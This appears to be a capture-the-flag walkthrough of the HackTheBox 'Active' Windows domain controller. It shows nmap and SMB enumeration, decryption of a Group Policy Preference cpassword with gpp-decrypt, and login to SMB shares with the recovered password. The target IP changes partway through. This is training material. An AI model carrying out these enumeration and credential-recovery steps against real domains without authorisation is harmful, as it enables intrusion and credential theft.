nmap -sC -sV -A -T4 10.129.186.200 -oN nmap.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 20:29 IST
Nmap scan report for 10.129.186.200
Host is up (0.16s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-07 15:00:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/7%OT=53%CT=1%CU=33667%PV=Y%DS=2%DC=T%G=Y%TM=61AF775
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M5
OS:4DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-12-07T15:01:32
|_  start_date: 2021-12-07T14:59:26
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
|_clock-skew: 2s

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   179.28 ms 10.10.14.1
2   179.35 ms 10.129.186.200

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.34 seconds




nslookup       
> server 10.129.186.200
Default server: 10.129.186.200
Address: 10.129.186.200#53
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.
> 10.129.186.200
;; connection timed out; no servers could be reached




SMB - TCP 139/445
SMB Enumeration
nmap --script safe -p 445 10.129.186.200 -oN smbnmap
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 20:48 IST
Pre-scan script results:
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_eap-info: please specify an interface with -e
| broadcast-listener: 
|   ether
|       ARP Request
|         sender ip    sender mac         target ip
|         192.168.1.1  14:a7:2b:27:56:d5  192.168.1.5
|   udp
|       SSDP
|         ip           uri
|         192.168.1.2   urn:dial-multiscreen-org:service:dial:1
|       DHCP
|         srv ip       cli ip       mask           gw           dns               vendor
|         192.168.1.1  192.168.1.5  255.255.255.0  192.168.1.1  8.8.8.8, 4.2.2.2  -
|_        192.168.1.1  192.168.1.4  255.255.255.0  192.168.1.1  8.8.8.8, 4.2.2.2  -
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_broadcast-pppoe-discover: ERROR: Script execution failed (use -d to debug)
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     Interface: wlan0
|     IP Offered: 192.168.1.5
|     Server Identifier: 192.168.1.1
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|_    Domain Name Server: 8.8.8.8, 4.2.2.2
| broadcast-igmp-discovery: 
|   192.168.1.1
|     Interface: wlan0
|     Version: 2
|     Group: 224.0.0.2
|     Description: All Routers on this Subnet
|   192.168.1.1
|     Interface: wlan0
|     Version: 2
|     Group: 224.0.0.22
|     Description: IGMP
|   192.168.1.1
|     Interface: wlan0
|     Version: 2
|     Group: 239.255.255.250
|     Description: Organization-Local Scope (rfc2365)
|_  Use the newtargets script-arg to add the results as targets
| broadcast-upnp-info: 
|   239.255.255.250
|       Server: OS 1.0 UPnP/1.0 Realtek/V1.0
|_      Location: http://192.168.1.1:52881/simplecfg.xml
Nmap scan report for active.htb (10.129.186.200)
Host is up (0.19s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| unusual-port: 
|_  WARNING: this script depends on Nmap's service/version detection (-sV)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-07T15:19:29
|_  start_date: 2021-12-07T14:59:26
| dns-blacklist: 
|   SPAM
|_    l2.apews.org - FAIL
|_fcrdns: FAIL (No PTR record)
|_msrpc-enum: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-capabilities: 
|   2.0.2: 
|     Distributed File System
|   2.1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb-protocols: 
|   dialects: 
|     2.0.2
|_    2.1
|_clock-skew: 2s
|_ipidseq: ERROR: Script execution failed (use -d to debug)
|_path-mtu: PMTU == 1500
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| port-states: 
|   tcp: 
|_    open: 445

Post-scan script results:
| reverse-index: 
|_  445/tcp: 10.129.186.200
Nmap done: 1 IP address (1 host up) scanned in 62.83 seconds


Given this is a Windows host, I’ll take a look at SMB. Enumerating SMB has always been something that I had to use a bunch of tools in what felt like imperfect ways. I had even written a post on the various tools for enumerating smb . Then IppSec tipped me off to smbmap. I had just finished this post, but (after updating the SMB enumeration checklist), I went back in to add how smbmap works as well at a couple steps.
List Shares

I originally solved this with enum4linux, but the problem with that tool is that it just dumps a bunch of information, and a lot of it seems like failures much of the time. Understanding what comes back can be difficult. Here’s the section of the output that was useful here

smbclient -L//10.129.186.200
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.186.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                            
┌──(root💀sac)-[~/Downloads/hackthebox/Active]
└─# enum4linux 10.129.186.200
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec  7 20:53:23 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.186.200
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 10.129.186.200    |
 ====================================================== 
[E] Can't find workgroup/domain


 ============================================== 
|    Nbtstat Information for 10.129.186.200    |
 ============================================== 
Looking up status of 10.129.186.200
No reply from 10.129.186.200

 ======================================= 
|    Session Check on 10.129.186.200    |
 ======================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.129.186.200 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ============================================= 
|    Getting domain SID for 10.129.186.200    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 10.129.186.200    |
 ======================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.129.186.200 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.129.186.200 from srvinfo:
        10.129.186.200 Wk Sv PDC Tim NT     Domain Controller
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b

 =============================== 
|    Users on 10.129.186.200    |
 =============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 =========================================== 
|    Share Enumeration on 10.129.186.200    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.129.186.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      



GPP Passwords

Whenever a new Group Policy Preference (GPP) is created, there’s an xml file created in the SYSVOL share with that config data, including any passwords associated with the GPP. For security, Microsoft AES encrypts the password before it’s stored as cpassword. But then Microsoft published the key on MSDN!

Microsoft issued a patch in 2014 that prevented admins from putting passwords into GPP. But that patch doesn’t do anything about any of these breakable passwords that were already there, and from what I understand, pentesters still find these regularly in 2018. For more details, check out this AD Security post.
Decrypting GPP Password

Since the key is known, I can decrypt the password. Kali has a tool called gpp-decrypt that will do it:
┌──(root💀sac)-[~/Downloads/hackthebox/Active]
└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                                                                                                               137 ⨯
GPPstillStandingStrong2k18


smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    NO ACCESS
        NETLOGON                                                READ ONLY
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY
        Users                                                   READ ONLY


When I connect to the Users share, it looks like the C:\users\ directory,

smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18                                                                                                         
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                         DHS        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                      DHS        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                10459647 blocks of size 4096. 6308502 blocks available
